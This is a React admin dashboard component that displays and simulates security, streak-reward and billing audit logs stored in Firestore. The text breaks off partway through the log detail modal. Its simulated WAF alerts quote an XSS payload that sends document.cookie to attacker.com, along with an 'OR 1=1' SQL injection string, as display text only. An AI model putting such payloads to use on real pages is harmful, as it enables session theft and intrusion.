import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Shield, 
  Flame, 
  CreditCard, 
  Search, 
  Filter, 
  Trash2, 
  Plus, 
  AlertTriangle, 
  CheckCircle2, 
  Clock, 
  User, 
  Globe, 
  FileText, 
  Terminal, 
  X, 
  RefreshCw,
  PlusCircle,
  HelpCircle,
  ChevronDown,
  Activity,
  UserCheck,
  ShieldCheck,
  Zap,
  DollarSign
} from 'lucide-react';
import { clsx } from 'clsx';
import { db } from '../firebase';
import { 
  collection, 
  addDoc, 
  getDocs, 
  deleteDoc, 
  doc, 
  updateDoc, 
  Timestamp, 
  query, 
  orderBy, 
  limit 
} from 'firebase/firestore';
import { toast } from 'sonner';
import { useAuth } from '../context/AuthContext';

export interface AuditLog {
  id: string;
  category: 'security' | 'streak' | 'plan' | 'system';
  action: string;
  details: string;
  adminEmail: string;
  timestamp: Date | Timestamp | any;
  severity: 'low' | 'medium' | 'high' | 'critical';
  ip?: string;
  resolved?: boolean;
}

export default function AdminAuditLogs() {
  const { user } = useAuth();
  const [logs, setLogs] = useState<AuditLog[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [categoryFilter, setCategoryFilter] = useState<'all' | 'security' | 'streak' | 'plan' | 'system'>('all');
  const [severityFilter, setSeverityFilter] = useState<'all' | 'low' | 'medium' | 'high' | 'critical'>('all');
  
  // Modal / Form states
  const [isNewLogOpen, setIsNewLogOpen] = useState(false);
  const [selectedLog, setSelectedLog] = useState<AuditLog | null>(null);
  
  // Custom Log Form fields
  const [formCategory, setFormCategory] = useState<'security' | 'streak' | 'plan' | 'system'>('system');
  const [formAction, setFormAction] = useState('');
  const [formDetails, setFormDetails] = useState('');
  const [formSeverity, setFormSeverity] = useState<'low' | 'medium' | 'high' | 'critical'>('low');
  const [formIp, setFormIp] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    fetchLogs();
  }, []);

  const fetchLogs = async () => {
    setLoading(true);
    try {
      const logsRef = collection(db, 'admin_audit_logs');
      const q = query(logsRef);
      const snapshot = await getDocs(q);
      const fetchedLogs: AuditLog[] = [];
      
      snapshot.forEach((docSnap) => {
        const data = docSnap.data();
        fetchedLogs.push({
          id: docSnap.id,
          category: data.category || 'system',
          action: data.action || 'Unknown Action',
          details: data.details || '',
          adminEmail: data.adminEmail || 'system@gmt.com',
          timestamp: data.timestamp,
          severity: data.severity || 'low',
          ip: data.ip || '',
          resolved: data.resolved || false
        });
      });

      // If no logs exist, seed some initial gorgeous prototype logs
      if (fetchedLogs.length === 0) {
        await seedDefaultLogs();
      } else {
        // Sort descending by timestamp
        sortAndSetLogs(fetchedLogs);
      }
    } catch (error) {
      console.error('Error fetching admin logs:', error);
      toast.error('Could not load audit logs from database.');
    } finally {
      setLoading(false);
    }
  };

  const sortAndSetLogs = (rawLogs: AuditLog[]) => {
    const sorted = [...rawLogs].sort((a, b) => {
      const timeA = a.timestamp instanceof Timestamp 
        ? a.timestamp.toDate().getTime() 
        : new Date(a.timestamp).getTime();
      const timeB = b.timestamp instanceof Timestamp 
        ? b.timestamp.toDate().getTime() 
        : new Date(b.timestamp).getTime();
      return timeB - timeA;
    });
    setLogs(sorted);
  };

  const seedDefaultLogs = async () => {
    const defaults: Omit<AuditLog, 'id'>[] = [
      {
        category: 'security',
        action: 'SQL Injection Blocked',
        details: 'Malicious payload detected in API path `/api/v1/users/search`. Query: `SELECT * FROM users WHERE id = OR 1=1`. Source flagged and IP temporarily restricted.',
        adminEmail: 'automated-waf@gmt.com',
        timestamp: Timestamp.fromDate(new Date(Date.now() - 1000 * 60 * 12)), // 12 mins ago
        severity: 'critical',
        ip: '45.33.22.11',
        resolved: false
      },
      {
        category: 'streak',
        action: 'User Daily Streak Modified',
        details: 'Admin modified streak values for subscriber `sunny@gmail.com`. Streak count bumped from 3 to 15 days to resolve customer support ticket GMT-4822.',
        adminEmail: user?.email || 'billworlddream1@gmail.com',
        timestamp: Timestamp.fromDate(new Date(Date.now() - 1000 * 60 * 45)), // 45 mins ago
        severity: 'medium',
        ip: '12.245.92.1',
        resolved: true
      },
      {
        category: 'plan',
        action: 'Created New Subscription Tier',
        details: 'Created "AI Video Ads Pro" subscription tier in `ai-ads` category at $49.99/month with 1000 credits/day limits.',
        adminEmail: user?.email || 'billworlddream1@gmail.com',
        timestamp: Timestamp.fromDate(new Date(Date.now() - 1000 * 60 * 120)), // 2h ago
        severity: 'low',
        ip: '12.245.92.1',
        resolved: true
      },
      {
        category: 'security',
        action: 'Brute-force Threat Detected',
        details: 'Repeated failed admin portal login attempts (8 times within 12 seconds) detected. Client browser blocked and source IP restricted.',
        adminEmail: 'security-gateway@gmt.com',
        timestamp: Timestamp.fromDate(new Date(Date.now() - 1000 * 60 * 360)), // 6h ago
        severity: 'high',
        ip: '185.190.140.23',
        resolved: false
      },
      {
        category: 'plan',
        action: 'Subscription Tier Paused',
        details: 'Admin paused subscription plan `Standard Mining Rig` (ID: mining_standard_v2) due to regional cloud resource re-allocation.',
        adminEmail: 'billworlddream1@gmail.com',
        timestamp: Timestamp.fromDate(new Date(Date.now() - 1000 * 60 * 1440)), // 1d ago
        severity: 'medium',
        ip: '92.14.201.88',
        resolved: true
      }
    ];

    try {
      const logsRef = collection(db, 'admin_audit_logs');
      const addedLogs: AuditLog[] = [];
      for (const log of defaults) {
        const docRef = await addDoc(logsRef, log);
        addedLogs.push({
          id: docRef.id,
          ...log
        });
      }
      sortAndSetLogs(addedLogs);
      toast.success('Database initialized with default audit logs.');
    } catch (err) {
      console.error('Failed to seed logs:', err);
    }
  };

  const handleCreateCustomLog = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formAction.trim() || !formDetails.trim()) {
      toast.error('Please fill out all required fields.');
      return;
    }

    setIsSubmitting(true);
    const newLogPayload = {
      category: formCategory,
      action: formAction.trim(),
      details: formDetails.trim(),
      adminEmail: user?.email || 'admin@gmt.com',
      timestamp: Timestamp.now(),
      severity: formSeverity,
      ip: formIp.trim() || 'Internal',
      resolved: false
    };

    try {
      const docRef = await addDoc(collection(db, 'admin_audit_logs'), newLogPayload);
      const newLogObj: AuditLog = {
        id: docRef.id,
        ...newLogPayload
      };
      
      setLogs(prev => [newLogObj, ...prev]);
      setIsNewLogOpen(false);
      
      // Reset form fields
      setFormAction('');
      setFormDetails('');
      setFormSeverity('low');
      setFormIp('');
      
      toast.success('Custom security event logged successfully.');
    } catch (err) {
      console.error('Failed to write log to Firestore:', err);
      toast.error('Failed to write log to database.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleToggleResolve = async (log: AuditLog) => {
    try {
      const logRef = doc(db, 'admin_audit_logs', log.id);
      await updateDoc(logRef, { resolved: !log.resolved });
      
      setLogs(prev => prev.map(item => item.id === log.id ? { ...item, resolved: !log.resolved } : item));
      if (selectedLog && selectedLog.id === log.id) {
        setSelectedLog(prev => prev ? { ...prev, resolved: !log.resolved } : null);
      }
      
      toast.success(`Event marked as ${!log.resolved ? 'Resolved' : 'Active'}.`);
    } catch (err) {
      console.error('Error toggling resolve state:', err);
      toast.error('Could not update event status.');
    }
  };

  const handleDeleteLog = async (logId: string) => {
    if (window.confirm('Are you sure you want to permanently delete this audit log record? This action cannot be undone.')) {
      try {
        await deleteDoc(doc(db, 'admin_audit_logs', logId));
        setLogs(prev => prev.filter(l => l.id !== logId));
        setSelectedLog(null);
        toast.success('Audit log record deleted.');
      } catch (err) {
        console.error('Error deleting log:', err);
        toast.error('Failed to delete log from Firestore.');
      }
    }
  };

  const simulateActivity = async (type: 'attack' | 'streak' | 'plan') => {
    const logsRef = collection(db, 'admin_audit_logs');
    let simulated: Omit<AuditLog, 'id'>;

    if (type === 'attack') {
      const attacks = [
        {
          action: 'XSS Attack Detected',
          details: 'WAF blocked an attempted Cross-Site Scripting (XSS) payload in profile status field: `<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>`. Client IP blacklisted.',
          severity: 'high' as const,
          ip: '203.0.113.88'
        },
        {
          action: 'Brute Force Alert on Support API',
          details: 'Client triggered multi-request rate-limit block on `/api/v1/tickets`. 45 requests received within 1.2 seconds.',
          severity: 'medium' as const,
          ip: '198.51.100.4'
        },
        {
          action: 'DDoS Traffic Mitigation Active',
          details: 'Global rate-limiter routing rules configured. Elevated volume of requests from regional autonomous system (AS39201) routed to high-latency inspection servers.',
          severity: 'high' as const,
          ip: 'Various (AS39201)'
        }
      ];
      const selected = attacks[Math.floor(Math.random() * attacks.length)];
      simulated = {
        category: 'security',
        action: selected.action,
        details: selected.details,
        adminEmail: 'security-waf@gmt.com',
        timestamp: Timestamp.now(),
        severity: selected.severity,
        ip: selected.ip,
        resolved: false
      };
    } else if (type === 'streak') {
      const amounts = [50, 100, 250, 500];
      const amt = amounts[Math.floor(Math.random() * amounts.length)];
      simulated = {
        category: 'streak',
        action: 'Streak Reward Disbursed',
        details: `System automatically completed a multi-day streak milestone reward payout of ${amt} SC (Supreme Coins) to user \`sunny@gmail.com\` for maintaining their active 7-day login streak.`,
        adminEmail: 'streak-bonus-daemon@gmt.com',
        timestamp: Timestamp.now(),
        severity: 'low',
        ip: 'Internal',
        resolved: true
      };
    } else {
      simulated = {
        category: 'plan',
        action: 'Plan Price Reduction Approved',
        details: 'Admin adjusted price tier for GMT Supreme Gold (ID: plans_supreme_v1). Updated billing parameters to drop annual price from $120.00 to $99.99 for upcoming seasonal promotion.',
        adminEmail: user?.email || 'billworlddream1@gmail.com',
        timestamp: Timestamp.now(),
        severity: 'medium',
        ip: '102.14.99.14',
        resolved: false
      };
    }

    try {
      const docRef = await addDoc(logsRef, simulated);
      const newLogObj: AuditLog = {
        id: docRef.id,
        ...simulated
      };
      setLogs(prev => [newLogObj, ...prev]);
      toast.success(`Live Audit Simulation: Registered new ${type} event.`);
    } catch (err) {
      console.error('Failed to register simulated log:', err);
    }
  };

  // Stats calculation
  const totalLogs = logs.length;
  const securityCount = logs.filter(l => l.category === 'security').length;
  const streakCount = logs.filter(l => l.category === 'streak').length;
  const planCount = logs.filter(l => l.category === 'plan').length;
  const criticalThreats = logs.filter(l => l.category === 'security' && (l.severity === 'critical' || l.severity === 'high') && !l.resolved).length;

  // Filter logic
  const filteredLogs = logs.filter(log => {
    const text = (log.action + ' ' + log.details + ' ' + log.adminEmail + ' ' + (log.ip || '')).toLowerCase();
    const matchesSearch = text.includes(searchTerm.toLowerCase());
    const matchesCategory = categoryFilter === 'all' || log.category === categoryFilter;
    const matchesSeverity = severityFilter === 'all' || log.severity === severityFilter;
    return matchesSearch && matchesCategory && matchesSeverity;
  });

  return (
    <div id="admin-audit-logs" className="space-y-8">
      {/* Top Banner Control */}
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 bg-zinc-900 border border-zinc-800 p-6 rounded-2xl">
        <div>
          <h2 className="text-xl font-bold text-white flex items-center gap-2">
            <Terminal className="w-6 h-6 text-[var(--color-supreme-gold)]" />
            Security & System Audit logs
          </h2>
          <p className="text-sm text-zinc-400 mt-1">
            Real-time administrative ledger monitoring security events, billing model changes, and streak milestones.
          </p>
        </div>
        
        <div className="flex flex-wrap gap-2">
          <button
            onClick={() => simulateActivity('attack')}
            className="px-3 py-2 bg-red-950/30 text-red-400 border border-red-500/20 hover:bg-red-500/10 rounded-xl transition-all text-xs font-bold flex items-center gap-1.5"
          >
            <Shield className="w-3.5 h-3.5" />
            Simulate Attack
          </button>
          <button
            onClick={() => simulateActivity('streak')}
            className="px-3 py-2 bg-amber-950/30 text-amber-400 border border-amber-500/20 hover:bg-amber-500/10 rounded-xl transition-all text-xs font-bold flex items-center gap-1.5"
          >
            <Flame className="w-3.5 h-3.5" />
            Simulate Streak Payout
          </button>
          <button
            onClick={() => simulateActivity('plan')}
            className="px-3 py-2 bg-blue-950/30 text-blue-400 border border-blue-500/20 hover:bg-blue-500/10 rounded-xl transition-all text-xs font-bold flex items-center gap-1.5"
          >
            <CreditCard className="w-3.5 h-3.5" />
            Simulate Plan Edit
          </button>
          <button
            onClick={fetchLogs}
            className="p-2 bg-zinc-800 hover:bg-zinc-700 text-zinc-300 rounded-xl border border-zinc-700 transition-all"
            title="Refresh Ledger"
          >
            <RefreshCw className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Audit Stats Grid */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <div className="bg-zinc-900 border border-zinc-800 p-5 rounded-2xl flex items-center gap-4">
          <div className="p-3 bg-red-500/10 text-red-500 rounded-xl">
            <Shield className="w-6 h-6" />
          </div>
          <div>
            <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-wider">WAF / Security Events</p>
            <p className="text-2xl font-bold text-white mt-0.5">{securityCount}</p>
            <p className="text-xs text-red-400 flex items-center gap-1 mt-0.5">
              <AlertTriangle className="w-3 h-3" />
              {criticalThreats} Active threats
            </p>
          </div>
        </div>

        <div className="bg-zinc-900 border border-zinc-800 p-5 rounded-2xl flex items-center gap-4">
          <div className="p-3 bg-amber-500/10 text-amber-500 rounded-xl">
            <Flame className="w-6 h-6" />
          </div>
          <div>
            <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-wider">Streak Audit Trails</p>
            <p className="text-2xl font-bold text-white mt-0.5">{streakCount}</p>
            <p className="text-xs text-zinc-500 mt-0.5">Payout milestone events</p>
          </div>
        </div>

        <div className="bg-zinc-900 border border-zinc-800 p-5 rounded-2xl flex items-center gap-4">
          <div className="p-3 bg-blue-500/10 text-blue-500 rounded-xl">
            <CreditCard className="w-6 h-6" />
          </div>
          <div>
            <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-wider">Plan modifications</p>
            <p className="text-2xl font-bold text-white mt-0.5">{planCount}</p>
            <p className="text-xs text-zinc-500 mt-0.5">Subscription billing audits</p>
          </div>
        </div>

        <div className="bg-zinc-900 border border-zinc-800 p-5 rounded-2xl flex items-center gap-4">
          <div className="p-3 bg-emerald-500/10 text-emerald-500 rounded-xl">
            <Activity className="w-6 h-6" />
          </div>
          <div>
            <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-wider">Ledger Integrity</p>
            <p className="text-2xl font-bold text-white mt-0.5">Active</p>
            <p className="text-xs text-emerald-400 mt-0.5">Total audited events: {totalLogs}</p>
          </div>
        </div>
      </div>

      {/* Main Table Feed */}
      <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-6 space-y-6">
        
        {/* Filter Controls */}
        <div className="flex flex-col lg:flex-row justify-between items-stretch lg:items-center gap-4 border-b border-zinc-800 pb-6">
          <div className="flex flex-wrap items-center gap-2.5">
            
            {/* Category Filter Pills */}
            <div className="flex bg-zinc-950 p-1 rounded-xl border border-zinc-800 gap-1 text-xs">
              <button
                onClick={() => setCategoryFilter('all')}
                className={clsx(
                  "px-3 py-1.5 rounded-lg font-bold transition-all",
                  categoryFilter === 'all' ? "bg-zinc-800 text-white" : "text-zinc-400 hover:text-white"
                )}
              >
                All Events
              </button>
              <button
                onClick={() => setCategoryFilter('security')}
                className={clsx(
                  "px-3 py-1.5 rounded-lg font-bold transition-all flex items-center gap-1",
                  categoryFilter === 'security' ? "bg-red-950/50 text-red-400 border border-red-500/20" : "text-zinc-400 hover:text-white"
                )}
              >
                <Shield className="w-3.5 h-3.5" />
                Security
              </button>
              <button
                onClick={() => setCategoryFilter('streak')}
                className={clsx(
                  "px-3 py-1.5 rounded-lg font-bold transition-all flex items-center gap-1",
                  categoryFilter === 'streak' ? "bg-amber-950/50 text-amber-400 border border-amber-500/20" : "text-zinc-400 hover:text-white"
                )}
              >
                <Flame className="w-3.5 h-3.5" />
                Streaks
              </button>
              <button
                onClick={() => setCategoryFilter('plan')}
                className={clsx(
                  "px-3 py-1.5 rounded-lg font-bold transition-all flex items-center gap-1",
                  categoryFilter === 'plan' ? "bg-blue-950/50 text-blue-400 border border-blue-500/20" : "text-zinc-400 hover:text-white"
                )}
              >
                <CreditCard className="w-3.5 h-3.5" />
                Plans
              </button>
              <button
                onClick={() => setCategoryFilter('system')}
                className={clsx(
                  "px-3 py-1.5 rounded-lg font-bold transition-all flex items-center gap-1",
                  categoryFilter === 'system' ? "bg-zinc-800 text-zinc-300" : "text-zinc-400 hover:text-white"
                )}
              >
                <Activity className="w-3.5 h-3.5" />
                System
              </button>
            </div>

            {/* Severity Filter Dropdown */}
            <div className="relative">
              <select
                value={severityFilter}
                onChange={(e) => setSeverityFilter(e.target.value as any)}
                className="bg-zinc-950 border border-zinc-800 text-xs text-zinc-300 rounded-xl px-4 py-2 focus:outline-none focus:border-[var(--color-supreme-gold)] font-bold cursor-pointer"
              >
                <option value="all">All Severities</option>
                <option value="low">Severity: Low</option>
                <option value="medium">Severity: Medium</option>
                <option value="high">Severity: High</option>
                <option value="critical">Severity: Critical</option>
              </select>
            </div>
          </div>

          <div className="flex items-center gap-3">
            {/* Search Input */}
            <div className="relative flex-1 lg:w-72">
              <Search className="absolute left-3 top-2.5 w-4 h-4 text-zinc-500" />
              <input
                type="text"
                placeholder="Search action details, admin, IP..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl py-2 pl-9 pr-4 text-xs text-zinc-100 focus:outline-none focus:border-[var(--color-supreme-gold)]"
              />
            </div>

            {/* Manual Entry Button */}
            <button
              onClick={() => setIsNewLogOpen(true)}
              className="px-4 py-2 bg-[var(--color-supreme-gold)] text-black font-black text-xs uppercase tracking-wider rounded-xl hover:bg-yellow-400 active:scale-95 transition-all flex items-center gap-1.5 shrink-0"
            >
              <PlusCircle className="w-4 h-4" />
              Log Event
            </button>
          </div>
        </div>

        {/* Audit Table Feed */}
        <div className="overflow-x-auto">
          {loading ? (
            <div className="flex flex-col items-center justify-center py-16 space-y-3">
              <RefreshCw className="w-8 h-8 text-[var(--color-supreme-gold)] animate-spin" />
              <p className="text-sm text-zinc-500">Decrypting administrative ledger...</p>
            </div>
          ) : filteredLogs.length === 0 ? (
            <div className="text-center py-16 bg-zinc-950/40 rounded-xl border border-zinc-800/50">
              <FileText className="w-12 h-12 text-zinc-700 mx-auto mb-3" />
              <p className="text-zinc-400 font-bold">No audited events found</p>
              <p className="text-xs text-zinc-600 mt-1">Try adjusting categories or search triggers.</p>
            </div>
          ) : (
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="border-b border-zinc-800/80 text-zinc-500 text-[10px] font-bold uppercase tracking-widest">
                  <th className="pb-3 pl-2">Event Category</th>
                  <th className="pb-3">Action Details</th>
                  <th className="pb-3">Admin Executor</th>
                  <th className="pb-3">Origin / IP</th>
                  <th className="pb-3">Timestamp</th>
                  <th className="pb-3 text-right pr-2">Ledger Action</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-zinc-800/60">
                {filteredLogs.map((log) => {
                  const timestampDate = log.timestamp instanceof Timestamp 
                    ? log.timestamp.toDate() 
                    : new Date(log.timestamp);
                  const timeString = timestampDate.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                  const dateString = timestampDate.toLocaleDateString([], { month: 'short', day: 'numeric', year: 'numeric' });

                  // UI categorization details
                  const meta = {
                    security: {
                      bg: 'bg-red-500/10 text-red-400 border-red-500/20',
                      icon: Shield
                    },
                    streak: {
                      bg: 'bg-amber-500/10 text-amber-400 border-amber-500/20',
                      icon: Flame
                    },
                    plan: {
                      bg: 'bg-blue-500/10 text-blue-400 border-blue-500/20',
                      icon: CreditCard
                    },
                    system: {
                      bg: 'bg-zinc-800 text-zinc-400 border-zinc-700',
                      icon: Terminal
                    }
                  }[log.category] || { bg: 'bg-zinc-800 text-zinc-400 border-zinc-700', icon: HelpCircle };

                  const Icon = meta.icon;

                  return (
                    <tr 
                      key={log.id} 
                      className={clsx(
                        "text-xs group hover:bg-zinc-800/20 transition-all cursor-pointer",
                        log.resolved && "opacity-60"
                      )}
                      onClick={() => setSelectedLog(log)}
                    >
                      {/* Event category tags */}
                      <td className="py-4 pl-2">
                        <div className="flex items-center gap-2">
                          <span className={clsx(
                            "inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[9px] font-extrabold uppercase tracking-widest border",
                            meta.bg
                          )}>
                            <Icon className="w-3 h-3" />
                            {log.category}
                          </span>
                        </div>
                      </td>

                      {/* Action details */}
                      <td className="py-4 pr-4 max-w-sm">
                        <div className="space-y-1">
                          <span className={clsx(
                            "font-bold text-white text-sm group-hover:text-[var(--color-supreme-gold)] transition-colors block",
                            log.resolved && "line-through text-zinc-500"
                          )}>
                            {log.action}
                          </span>
                          <span className="text-zinc-400 line-clamp-1 block text-xs">
                            {log.details}
                          </span>
                        </div>
                      </td>

                      {/* Admin Executor details */}
                      <td className="py-4 font-mono text-zinc-400">
                        <div className="flex items-center gap-1.5">
                          <User className="w-3.5 h-3.5 text-zinc-600" />
                          <span>{log.adminEmail}</span>
                        </div>
                      </td>

                      {/* IP Origin */}
                      <td className="py-4 font-mono text-zinc-400">
                        <div className="flex items-center gap-1.5">
                          <Globe className="w-3.5 h-3.5 text-zinc-600" />
                          <span>{log.ip || 'Internal'}</span>
                        </div>
                      </td>

                      {/* Timestamp */}
                      <td className="py-4 text-zinc-400">
                        <div className="space-y-0.5">
                          <p className="font-semibold text-white">{dateString}</p>
                          <p className="text-[10px] text-zinc-500 font-mono">{timeString}</p>
                        </div>
                      </td>

                      {/* Severity & Ledger Actions */}
                      <td className="py-4 text-right pr-2" onClick={(e) => e.stopPropagation()}>
                        <div className="flex items-center justify-end gap-2">
                          <span className={clsx(
                            "px-2 py-0.5 rounded text-[9px] font-bold uppercase tracking-wide",
                            log.severity === 'critical' && "bg-red-500/20 text-red-400 border border-red-500/30",
                            log.severity === 'high' && "bg-orange-500/20 text-orange-400 border border-orange-500/30",
                            log.severity === 'medium' && "bg-amber-500/20 text-amber-400 border border-amber-500/30",
                            log.severity === 'low' && "bg-zinc-800 text-zinc-400"
                          )}>
                            {log.severity}
                          </span>

                          <button
                            onClick={() => handleToggleResolve(log)}
                            className={clsx(
                              "px-2.5 py-1 rounded text-[10px] font-bold border transition-colors",
                              log.resolved 
                                ? "bg-zinc-800 border-zinc-700 text-zinc-500 hover:text-zinc-300"
                                : "bg-emerald-500/10 border-emerald-500/20 text-emerald-400 hover:bg-emerald-500/20"
                            )}
                            title={log.resolved ? "Re-open incident" : "Resolve incident"}
                          >
                            {log.resolved ? 'Reopen' : 'Resolve'}
                          </button>

                          <button
                            onClick={() => handleDeleteLog(log.id)}
                            className="p-1.5 bg-zinc-800 hover:bg-red-950/40 text-zinc-500 hover:text-red-400 border border-zinc-700 hover:border-red-500/20 rounded-lg transition-colors"
                            title="Purge Record"
                          >
                            <Trash2 className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          )}
        </div>
      </div>

      {/* Manual Entry Form Dialog */}
      <AnimatePresence>
        {isNewLogOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="bg-zinc-900 border border-zinc-800 p-8 rounded-[2rem] w-full max-w-lg space-y-6 text-white shadow-2xl relative"
            >
              <button 
                onClick={() => setIsNewLogOpen(false)}
                className="absolute top-6 right-6 p-2 rounded-xl bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 text-zinc-400 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>

              <div className="flex items-center gap-3">
                <div className="p-3 bg-[var(--color-supreme-gold)]/10 rounded-2xl border border-[var(--color-supreme-gold)]/20 text-[var(--color-supreme-gold)]">
                  <Terminal className="w-6 h-6" />
                </div>
                <div>
                  <h4 className="text-xl font-bold">Write Audit Event</h4>
                  <p className="text-xs text-zinc-500">Record a custom security alert, billing modification, or support detail</p>
                </div>
              </div>

              <form onSubmit={handleCreateCustomLog} className="space-y-4">
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label className="text-[10px] font-bold text-zinc-400 uppercase tracking-widest">Category</label>
                    <select
                      value={formCategory}
                      onChange={(e) => setFormCategory(e.target.value as any)}
                      className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[var(--color-supreme-gold)] cursor-pointer"
                    >
                      <option value="security">Security Event</option>
                      <option value="streak">Streak Bonus</option>
                      <option value="plan">Plan / Pricing</option>
                      <option value="system">System Admin</option>
                    </select>
                  </div>

                  <div className="space-y-2">
                    <label className="text-[10px] font-bold text-zinc-400 uppercase tracking-widest">Severity</label>
                    <select
                      value={formSeverity}
                      onChange={(e) => setFormSeverity(e.target.value as any)}
                      className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[var(--color-supreme-gold)] cursor-pointer"
                    >
                      <option value="low">Severity: Low</option>
                      <option value="medium">Severity: Medium</option>
                      <option value="high">Severity: High</option>
                      <option value="critical">Severity: Critical</option>
                    </select>
                  </div>
                </div>

                <div className="space-y-2">
                  <label className="text-[10px] font-bold text-zinc-400 uppercase tracking-widest">Action Title</label>
                  <input 
                    type="text" 
                    required
                    value={formAction}
                    onChange={(e) => setFormAction(e.target.value)}
                    placeholder="e.g. Blocked Port Access"
                    className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[var(--color-supreme-gold)]"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-[10px] font-bold text-zinc-400 uppercase tracking-widest">Details / Description</label>
                  <textarea 
                    required
                    rows={4}
                    value={formDetails}
                    onChange={(e) => setFormDetails(e.target.value)}
                    placeholder="Enter comprehensive description of security triggers or ledger changes..."
                    className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[var(--color-supreme-gold)] resize-none"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-[10px] font-bold text-zinc-400 uppercase tracking-widest">Source IP Address (Optional)</label>
                  <input 
                    type="text" 
                    value={formIp}
                    onChange={(e) => setFormIp(e.target.value)}
                    placeholder="e.g. 192.168.1.1 or Internal"
                    className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[var(--color-supreme-gold)] font-mono"
                  />
                </div>

                <div className="flex justify-end gap-3 border-t border-zinc-800 pt-6">
                  <button 
                    type="button" 
                    onClick={() => setIsNewLogOpen(false)}
                    className="px-5 py-3 rounded-xl text-xs font-bold bg-zinc-800 hover:bg-zinc-700 text-zinc-300 transition-colors"
                  >
                    Cancel
                  </button>
                  <button 
                    type="submit" 
                    disabled={isSubmitting}
                    className="px-6 py-3 rounded-xl text-xs font-black uppercase tracking-wider bg-[var(--color-supreme-gold)] text-black hover:bg-yellow-400 transition-all flex items-center gap-1.5 disabled:opacity-50"
                  >
                    {isSubmitting ? (
                      <RefreshCw className="w-4 h-4 animate-spin" />
                    ) : (
                      <CheckCircle2 className="w-4 h-4" />
                    )}
                    Commit Event Log
                  </button>
                </div>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Log Detail Overlay Modal */}
      <AnimatePresence>
        {selectedLog && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="bg-zinc-900 border border-zinc-800 p-8 rounded-[2rem] w-full max-w-2xl text-white shadow-2xl relative space-y-6"
            >
              <button 
                onClick={() => setSelectedLog(null)}
                className="absolute top-6 right-6 p-2 rounded-xl bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 text-zinc-400 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>

              <div className="flex items-center gap-4 border-b border-zinc-800 pb-5">
                <div className={clsx(
                  "p-3.5 rounded-2xl border",
                  selectedLog.category === 'security' && "bg-red-500/10 text-red-400 border-red-500/20",
                  selectedLog.category === 'streak' && "bg-amber-500/10 text-amber-400 border-amber-500/20",
                  selectedLog.category === 'plan' && "bg-blue-500/10 text-blue-400 border-blue-500/20",
                  selectedLog.category === 'system' && "bg-zinc-800 text-zinc-400 border-zinc-700"
                )}>
                  {selectedLog.category === 'security' && <Shield className="w-7 h-7" />}
                  {selectedLog.category === 'streak' && <Flame className="w-7 h-7" />}
                  {selectedLog.category === 'plan' && <CreditCard className="w-7 h-7" />}
                  {selectedLog.category === 'system' && <Terminal className="w-7 h-7" />}
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <span className="text-[10px] font-mono uppercase tracking-widest text-zinc-500">Log ID: #{selectedLog.id}</span>
                    <span className={clsx(
                      "px-2 py-0.5 rounded text-[8px] font-bold uppercase tracking-wider",
                      selectedLog.resolved ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" : "bg-red-500/10 text-red-400 border border-red-500/20"
                    )}>
                      {selectedLog.resolved ? 'Resolved' : 'Active / Unresolved'}
                    </span>
                  </div>
                  <h4 className="text-xl font-bold text-white mt-1">{selectedLog.action}</h4>
                </div>
              </div>

              {/* Log Information Panels */}
              <div className="grid grid-cols-2 gap-4">
                <div className="p-4 bg-zinc-950 rounded-2xl border border-zinc-800/80 space-y-1">
                  <span className="text-[10px] text-zinc-500 uppercase font-bold tracking-wider">Audited Executor</span>
                  <p className="font-mono text-sm text-zinc-300 truncate">{selectedLog.adminEmail}</p>
                </div>

                <div className="p-4 bg-zinc-950 rounded-2xl border border-zinc-800/80 space-y-1">
